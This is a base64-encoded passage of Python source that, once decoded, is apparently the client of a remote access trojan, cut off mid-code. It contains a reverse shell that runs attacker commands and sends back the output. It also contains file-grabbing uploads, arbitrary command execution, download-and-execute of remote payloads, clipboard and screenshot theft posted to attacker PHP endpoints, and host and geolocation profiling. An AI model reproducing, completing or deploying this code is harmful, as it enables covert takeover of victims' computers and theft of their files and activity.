CAgICAgICAgICAgICAgICAgICAgICAgICAgIHNwbGl0X3N0cmluZ3MgPSBpbnB1dF9zdHJpbmcuc3BsaXQoIjoiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXBfYWRkcmVzcyA9IHNwbGl0X3N0cmluZ3NbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBvcnRfbnVtYmVyID0gc3BsaXRfc3RyaW5nc1sxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIklQIEFkZHJlc3M6IiwgaXBfYWRkcmVzcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJQb3J0IE51bWJlcjoiLCBwb3J0X251bWJlcikNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIHNoZWxsKCk6DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMuY29ubmVjdCgoc3RyKGlwX2FkZHJlc3MpLCBpbnQocG9ydF9udW1iZXIpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gcy5yZWN2KDEwMjQpLmRlY29kZSgidXRmLTgiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZC5sb3dlcigpID09ICJleGl0IjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLmNsb3NlKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChjb21tYW5kLCBzaGVsbD1UcnVlLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMuc2VuZChvdXRwdXQpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJDb25uZWN0aW9uIGZhaWxlZDoiLCBzdHIoZSkpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2hlbGwpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdC5zdGFydCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgRToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KEUpDQogICAgICANCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICJTSEVMTC1FWFQtSFRUUCIgaW4gZmluZDoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChicmNrKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5wdXRfc3RyaW5nID0gYnJjaw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3BsaXRfc3RyaW5ncyA9IGlucHV0X3N0cmluZy5zcGxpdCgiOiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpcF9hZGRyZXNzID0gc3BsaXRfc3RyaW5nc1swXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcG9ydF9udW1iZXIgPSBzcGxpdF9zdHJpbmdzWzFdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiSVAgQWRkcmVzczoiLCBpcF9hZGRyZXNzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlBvcnQgTnVtYmVyOiIsIHBvcnRfbnVtYmVyKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWYgc2hlbGwoKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlZiBzZW5kX3Bvc3QoZGF0YSwgdXJsPWYnaHR0cDovL3tpcF9hZGRyZXNzfTp7cG9ydF9udW1iZXJ9Jyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0geyJyZmlsZSI6IGRhdGF9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gcGFyc2UudXJsZW5jb2RlKGRhdGEpLmVuY29kZSgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXEgPSByZXF1ZXN0LlJlcXVlc3QodXJsLCBkYXRhPWRhdGEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0LnVybG9wZW4ocmVxKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlZiBzZW5kX2ZpbGUoY29tbWFuZCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JhYiwgcGF0aCA9IGNvbW1hbmQuc3RyaXAoKS5zcGxpdCgnICcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0b3JlX3VybCA9IGYnaHR0cDovL3tpcF9hZGRyZXNzfTp7cG9ydF9udW1iZXJ9L3N0b3JlJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgsICdyYicpIGFzIGZwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfcG9zdChmcC5yZWFkKCksIHVybD1zdG9yZV91cmwpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIHJ1bl9jb21tYW5kKGNvbW1hbmQpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ01EID0gc3VicHJvY2Vzcy5Qb3Blbihjb21tYW5kLCBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsIHNoZWxsPVRydWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kX3Bvc3QoQ01ELnN0ZG91dC5yZWFkKCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kX3Bvc3QoQ01ELnN0ZGVyci5yZWFkKCkpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gcmVxdWVzdC51cmxvcGVuKGYiaHR0cDovL3tpcF9hZGRyZXNzfTp7cG9ydF9udW1iZXJ9IikucmVhZCgpLmRlY29kZSgpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICd0ZXJtaW5hdGUnIGluIGNvbW1hbmQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2dyYWInIGluIGNvbW1hbmQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9maWxlKGNvbW1hbmQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU2DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJ1bl9jb21tYW5kKGNvbW1hbmQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJDb25uZWN0aW9uIGZhaWxlZDoiLCBzdHIoZSkpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2hlbGwpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdC5zdGFydCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgRToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KEUpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgIkVDSE8iIGluIGZpbmQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGJyY2spDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAiTUVTU0FHRSIgaW4gZmluZDoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChicmNrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0cyA9IGJyY2suc3BsaXQoIjoiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZSA9IHBhcnRzWzBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJvZHkgPSBwYXJ0c1sxXQ0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJUaXRsZToiLCB0aXRsZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkJvZHk6IiwgYm9keSkNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGd1aSA9PSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdCA9IHRrLlRrKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3Qud2l0aGRyYXcoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGtpbnRlci5tZXNzYWdlYm94LnNob3dpbmZvKHRpdGxlLCBib2R5KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdC5kZXN0cm95KCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICJDTUQiIGluIGZpbmQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbShicmNrKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgIkRPV05MT0FEIiBpbiBmaW5kOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGJyY2spDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZWRfdXJsID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKGJyY2spDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShwYXJzZWRfdXJsLnBhdGgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhdmVfZGlyZWN0b3J5ID0gb3MuZ2V0Y3dkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWxfZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHNhdmVfZGlyZWN0b3J5LCBmaWxlbmFtZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsbGliLnJlcXVlc3QudXJscmV0cmlldmUoYnJjaywgbG9jYWxfZmlsZV9wYXRoKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuYW1lID0gcGxhdGZvcm0udW5hbWUoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRpbmdfc3lzdGVtID0gdW5hbWUuc3lzdGVtDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3BlcmF0aW5nX3N5c3RlbSA9PSAnV2luZG93cyc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5zdGFydGZpbGUobG9jYWxfZmlsZV9wYXRoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXywgZmlsZV9leHRlbnNpb24gPSBvcy5wYXRoLnNwbGl0ZXh0KGxvY2FsX2ZpbGVfcGF0aCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZmlsZV9leHRlbnNpb24gPT0gJy5zaCc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydiYXNoJywgbG9jYWxfZmlsZV9wYXRoXSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgZmlsZV9leHRlbnNpb24gPT0gJy5weSc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydweXRob24zJywgbG9jYWxfZmlsZV9wYXRoXSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgZmlsZV9leHRlbnNpb24gPT0gJy5qYXInOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsnamF2YScsICctamFyJywgbG9jYWxfZmlsZV9wYXRoXSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgb3MuYWNjZXNzKGxvY2FsX2ZpbGVfcGF0aCwgb3MuWF9PSyk6ICAjIENoZWNrIGlmIHRoZSBmaWxlIGlzIGV4ZWN1dGFibGUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJy4vJyArIGxvY2FsX2ZpbGVfcGF0aF0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyd4ZGctb3BlbicsIGxvY2FsX2ZpbGVfcGF0aF0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAiQ0xJUEJPQVJEIiBpbiBmaW5kOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdCA9IHRrLlRrKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3Qud2l0aGRyYXcoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xpcGJvYXJkX2NvbnRlbnRzID0gcm9vdC5jbGlwYm9hcmRfZ2V0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuZGVzdHJveSgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXN0b21fZGF0YSA9IGNsaXBib2FyZF9jb250ZW50cw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsID0gc2VuZHRvdXJsKyJzdG9yZS1kYXRhLnBocCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9eyJkYXRhIjogY3VzdG9tX2RhdGF9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoImRhdGEgc2VudCIsdXJsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgIlNDUkVFTlNIT1QiIGluIGZpbmQ6DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5hbWUgPSBwbGF0Zm9ybS51bmFtZSgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdGluZ19zeXN0ZW0gPSB1bmFtZS5zeXN0ZW0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvcGVyYXRpbmdfc3lzdGVtID09ICdXaW5kb3dzJzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGltID0gcHlhdXRvZ3VpLnNjcmVlbnNob3QoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW0gPSBJbWFnZUdyYWIuZ3JhYigpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW1fYnl0ZXMgPSBpby5CeXRlc0lPKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW0uc2F2ZShpbV9ieXRlcywgZm9ybWF0PSdQTkcnKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVzID0geydzY3JlZW5zaG90JzogKCdzY3JlZW5zaG90LnBuZycsIGltX2J5dGVzLmdldHZhbHVlKCksICdpbWFnZS9wbmcnKX0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHNlbmR0b3VybCArICdzY3JlZW5zaG90LnBocCcsIGZpbGVzPWZpbGVzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChyZXNwb25zZS50ZXh0KQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgIkVYVFJBQ1QiIGluIGZpbmQ6DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiZXh0cmFjdCBjb21tYW5kIHJlY2lldmVkIikNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VwID0gb3MucGF0aC5zZXANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKHN5cy5hcmd2WzBdKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuZXhlY3V0YWJsZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9kaXJlY3RvcnkgPSBvcy5wYXRoLmRpcm5hbWUoc2NyaXB0X3BhdGgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRfZmlsZW5hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKHNjcmlwdF9wYXRoKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRfZGlyZWN0b3J5X2ZpbGVuYW1lID0gc2NyaXB0X2RpcmVjdG9yeStzZXArc2NyaXB0X2ZpbGVuYW1lDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuYW1lID0gcGxhdGZvcm0udW5hbWUoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHVibGljX2lwID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cHM6Ly9pZGVudC5tZScpLnJlYWQoKS5kZWNvZGUoJ3V0ZjgnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpdmF0ZV9pcCA9IHNvY2tldC5nZXRob3N0YnluYW1lKHNvY2tldC5nZXRob3N0bmFtZSgpKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYWNfYWRkcmVzcyA9ICgnOicuam9pbihbJ3s6MDJ4fScuZm9ybWF0KCh1dWlkLmdldG5vZGUoKSA+PiBlbGUpICYgMHhmZikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgZWxlIGluIHJhbmdlKDAsOCo2LDgpXVs6Oi0xXSkpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdGluZ19zeXN0ZW0gPSB1bmFtZS5zeXN0ZW0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdGluZ19zeXN0ZW1fdmVyc2lvbiA9IHBsYXRmb3JtLnZlcnNpb24oKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3lzdGVtX2hvc3RuYW1lID0gc29ja2V0LmdldGhvc3RuYW1lKCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3lzdGVtX2FyY2hpdGVjdHVyZSA9IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpO3N0cmluZyA9IHN5c3RlbV9hcmNoaXRlY3R1cmU7c3RyaW5nPXN0cigNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcpO3N0cmluZz1zdHJpbmcucmVwbGFjZSgiJyIsIiIpO3N0cmluZz1zdHJpbmcucmVwbGFjZSgiKSIsIiIpO3N0cmluZz1zdHJpbmcucmVwbGFjZSgiKCIsIiIpO3N5c3RlbV9hcmNoaXRlY3R1cmU9c3RyaW5nDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2Nlc3Nvcl9idWlsZCA9IHVuYW1lLm1hY2hpbmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNwdV9jb3VudCA9IG9zLmNwdV9jb3VudCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbCwgdXNlZCwgZnJlZSA9IHNodXRpbC5kaXNrX3VzYWdlKCIvIikNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ3RvdGFsX3N0b3JhZ2UgPSAiVG90YWwgQzogU3RvcmFnZTogJWQgZ2IiICUgKHRvdGFsIC8vICgyKiozMCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDdXNlZF9zdG9yYWdlID0gIlVzZWQgQzogU3RvcmFnZTogJWQgZ2IiICUgKHVzZWQgLy8gKDIqKjMwKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENmcmVlX3N0b3JhZ2UgPSAiRnJlZSBDOiBTdG9yYWdlOiAlZCBnYiIgJSAoZnJlZSAvLyAoMioqMzApKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVubmluZ19wcm9jZXNzZXMgPSBvcy5wb3Blbignd21pYyBwcm9jZXNzIGdldCBkZXNjcmlwdGlvbiwgcHJvY2Vzc2lkJykucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRpbmdfc3lzdGVtID0gcGxhdGZvcm0uc3lzdGVtKCkNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChmJ2h0dHA6Ly9pcC1hcGkuY29tL2pzb24ve3B1YmxpY19pcH0nKS5jb250ZW50DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0ganNvbi5sb2FkcyhyZXNwb25zZSkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudF9hdmFpbGFibGVfZHJpdmVzID0gZHJpdmVzID0gW2Nocih4KSsiOiJmb3IgeCBpbiByYW5nZSg2NSw5MSlpZiBvcy5wYXRoLmV4aXN0cyhjaHIoeCkrIjoiKV07c3RyaW5nPWRyaXZlcztzdHJpbmc9c3RyKA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyk7c3RyaW5nPXN0cmluZy5yZXBsYWNlKCJdIiwiIik7c3RyaW5nPXN0cmluZy5yZXBsYWNlKCJbIiwiIik7c3RyaW5nPXN0cmluZy5yZXBsYWNlKCInIiwiIik7Y3VycmVudF9hdmFpbGFibGVfZHJpdmVzPXN0cmluZw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvcGVyYXRpbmdfc3lzdGVtICE9ICdXaW5kb3dzJzoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9zLmdldGV1aWQoKSA9PSAwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcml2ID0gVHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaXYgPSBGYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdCA9IGYnJycNCg0KDQogICAgPS09LT0tPS09LT0gR0VPIElORk9STUFUSU9OID0tPS09LT0tPS09DQoNCiAgICBDb3VudHJ5OiB7ZGF0YVsnY291bnRyeSddfQ0KICAgIFJlZ2lvbjoge2RhdGFbJ3JlZ2lvbk5hbWUnXX0NCiAgICBDaXR5OiB7ZGF0YVsnY2l0